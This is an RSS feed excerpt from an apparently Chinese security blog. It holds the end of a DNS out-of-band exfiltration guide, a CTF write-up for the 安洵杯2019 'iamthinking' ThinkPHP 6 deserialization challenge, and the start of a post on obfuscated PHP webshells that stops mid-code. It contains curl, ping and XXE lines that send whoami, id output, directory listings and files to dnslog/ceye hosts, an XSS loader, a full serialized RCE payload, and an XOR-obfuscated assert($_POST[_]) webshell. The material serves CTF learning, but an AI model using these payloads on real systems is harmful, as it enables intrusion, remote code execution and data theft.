&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; ping &lt;span style=&#34;color:#f1fa8c&#34;&gt;`&lt;/span&gt;whoami&lt;span style=&#34;color:#f1fa8c&#34;&gt;`&lt;/span&gt;.xxxx.ceye.io
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; curl http://haha.xxx.ceye.io/&lt;span style=&#34;color:#f1fa8c&#34;&gt;`&lt;/span&gt;whoami&lt;span style=&#34;color:#f1fa8c&#34;&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;像这里还有复杂点的，base64，多行输出等等&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl http://xxx.dnslog.link/&lt;span style=&#34;color:#ff79c6&#34;&gt;$(&lt;/span&gt;id|base64|tr &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; i in &lt;span style=&#34;color:#ff79c6&#34;&gt;$(&lt;/span&gt;ls /&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt;;&lt;span style=&#34;color:#ff79c6&#34;&gt;do&lt;/span&gt; curl &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;http://&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$i&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;.xxx.dnslog.link/&amp;#34;&lt;/span&gt;;&lt;span style=&#34;color:#ff79c6&#34;&gt;done&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Windows&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ping &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;%USERNAME%&lt;/span&gt;.xxx.ceye.io
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里也有复杂点的，其实都是配合命令行来&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;获取计算机名：for /F &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;delims=\&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;%i in (&amp;#39;whoami&amp;#39;) do ping -n 1 %&lt;/span&gt;i.xxx.dnslog.link
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;获取用户名：for /F &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;delims=\ tokens=2&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;%i in (&amp;#39;whoami&amp;#39;) do ping -n 1 %&lt;/span&gt;i.xxx.dnslog.link
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;3无回显ssrf&#34;&gt;3.无回显SSRF&lt;/h4&gt;
&lt;p&gt;基本是把url换成想要的SSRF.xxxx.ceye.io&lt;/p&gt;
&lt;h4 id=&#34;4xss跨站&#34;&gt;4.XSS跨站&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;script src&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;http&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;//XSS.XXXXX.ceye.io&amp;gt;&amp;lt;/script&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;5xxe&#34;&gt;5.XXE&lt;/h4&gt;
&lt;p&gt;改dtd：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-dtd&#34; data-lang=&#34;dtd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;!ENTITY&lt;/span&gt; % all
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;lt;!ENTITY % send SYSTEM &amp;#39;http://xxxx.ceye.io/%file;&amp;#39;&amp;gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;%all;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;tips&#34;&gt;Tips&lt;/h3&gt;
&lt;p&gt;**为什么要使用DNS注入？**同学面试的时候被问过，原话是：除了上述这些（报错，盲注等）注入，sql注入有没有啥快速跑出来的方法？&lt;/p&gt;
&lt;p&gt;盲注跑数据太慢的情况下，可以选择&lt;strong&gt;DNS&lt;/strong&gt;注入。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>[安洵杯2019]iamthinking</title>
        <link>https://proben1.github.io/2022/%E5%AE%89%E6%B4%B5%E6%9D%AF2019iamthinking/</link>
        <pubDate>Thu, 12 May 2022 23:31:13 +0800</pubDate>
        
        <guid>https://proben1.github.io/2022/%E5%AE%89%E6%B4%B5%E6%9D%AF2019iamthinking/</guid>
        <description>&lt;p&gt;www.zip源码泄露，Thinkphp6.0，代码在app/controller/Index.php&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;?&lt;/span&gt;php
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;namespace&lt;/span&gt; app\controller;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;use&lt;/span&gt; app\BaseController;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;Index&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;extends&lt;/span&gt; BaseController
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;index&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;lt;img src=&amp;#39;../test.jpg&amp;#39;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;/&amp;gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$paylaod&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;@&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;payload&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(isset(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$paylaod&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; parse_url(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_SERVER&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;REQUEST_URI&amp;#39;&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            parse_str(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;query&amp;#39;&lt;/span&gt;],&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$query&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#ff79c6&#34;&gt;foreach&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$query&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;as&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$value&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(preg_match(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;/^O/i&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$value&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#ff79c6&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;STOP HACKING&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#ff79c6&#34;&gt;exit&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            unserialize(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$paylaod&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;parse_url()&lt;/p&gt;
&lt;p&gt;1.//upload?如果是//，则被解析成host, 后面的内容如果有/,被解析出path，而不是query了&lt;/p&gt;
&lt;p&gt;2.如果path部分为///，则解析错误&lt;/p&gt;
&lt;p&gt;工具：https://github.com/wh1t3p1g/phpggc&lt;/p&gt;
&lt;p&gt;使用：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./phpggc -l
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./phpggc -u ThinkPHP/RCE2  &amp;#39;system(&amp;#34;cat /flag&amp;#34;);&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;payload:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;///public/?payload=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A13%3A%22%00%2A%00connection%22%3Bs%3A5%3A%22mysql%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3BN%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3BN%3Bs%3A18%3A%22%00think%5CModel%00force%22%3BN%3Bs%3A13%3A%22%00%2A%00connection%22%3BN%3Bs%3A9%3A%22%00%2A%00suffix%22%3BN%3Bs%3A21%3A%22%00think%5CModel%00relation%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A10%3A%22%00%2A%00visible%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure%22%3A200%3A%7Ba%3A5%3A%7Bs%3A3%3A%22use%22%3Ba%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A20%3A%22system%28%22cat+%2Fflag%22%29%3B%22%3B%7Ds%3A8%3A%22function%22%3Bs%3A38%3A%22function+%28%29+use+%28%24code%29+%7Beval%28%24code%29%3B%7D%22%3Bs%3A5%3A%22scope%22%3BN%3Bs%3A4%3A%22this%22%3BN%3Bs%3A4%3A%22self%22%3Bs%3A32%3A%220000000079ea1027000000003c8828b6%22%3B%7D%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A7%3A%22%00%2A%00type%22%3BN%3Bs%3A12%3A%22%00%2A%00withEvent%22%3BN%3B%7Ds%3A21%3A%22%00think%5CModel%00relation%22%3BN%3Bs%3A10%3A%22%00%2A%00visible%22%3BN%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3BN%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A7%3A%22%00%2A%00type%22%3BN%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3B%7D
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>离谱与webshell</title>
        <link>https://proben1.github.io/2022/%E7%A6%BB%E8%B0%B1%E4%B8%8Ewebshell/</link>
        <pubDate>Thu, 12 May 2022 20:53:12 +0800</pubDate>
        
        <guid>https://proben1.github.io/2022/%E7%A6%BB%E8%B0%B1%E4%B8%8Ewebshell/</guid>
        <description>&lt;p&gt;php5中assert是一个函数，我们可以通过&lt;code&gt;$f=&#39;assert&#39;;$f(...);&lt;/code&gt;这样的方法来动态执行任意代码。&lt;/p&gt;
&lt;p&gt;但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码.但也不是不行,也有其他的方法,比如file_put_contents这些函数&lt;/p&gt;
&lt;p&gt;所以这些都是用php5里的assert(),但是可以为php7.x版本提供思路&lt;/p&gt;
&lt;p&gt;下面,pass it!&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;?&lt;/span&gt;php
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#ff79c6&#34;&gt;!&lt;/span&gt;preg_match(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;/[a-z0-9]/is&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;shell&amp;#39;&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ff79c6&#34;&gt;eval&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;shell&amp;#39;&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;异或&#34;&gt;异或&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;?&lt;/span&gt;php
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;%01&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;`&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;%13&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;`&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;%13&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;`&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;%05&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;`&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;%12&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;`&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;%14&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;`&amp;#39;&lt;/span&gt;); &lt;span style=&#34;color:#6272a4&#34;&gt;// $_=&amp;#39;assert&amp;#39;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;_&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;%0D&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;]&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;%2F&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;`&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;%0E&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;]&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;%09&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;]&amp;#39;&lt;/span&gt;); &lt;span style=&#34;color:#6272a4&#34;&gt;// $__=&amp;#39;_POST&amp;#39;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$___&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$$__&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$___&lt;/span&gt;[_]); &lt;span style=&#34;color:#6272a4&#34;&gt;// assert($_POST[_]);
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;取反&#34;&gt;取反&lt;/h2&gt;
&lt;p&gt;UTF-8编码的某个汉字，并将其中某个字符取出来，比如&lt;code&gt;&#39;和&#39;{2}&lt;/code&gt;的结果是&lt;code&gt;&amp;quot;\x8c&amp;quot;&lt;/code&gt;，其取反即为字母&lt;code&gt;s&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;弱类型，true的值为1，故&lt;code&gt;true+true==2&lt;/code&gt;，也就是&lt;code&gt;(&#39;&amp;gt;&#39;&amp;gt;&#39;&amp;lt;&#39;)+(&#39;&amp;gt;&#39;&amp;gt;&#39;&amp;lt;&#39;)==2&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;?&lt;/span&gt;php
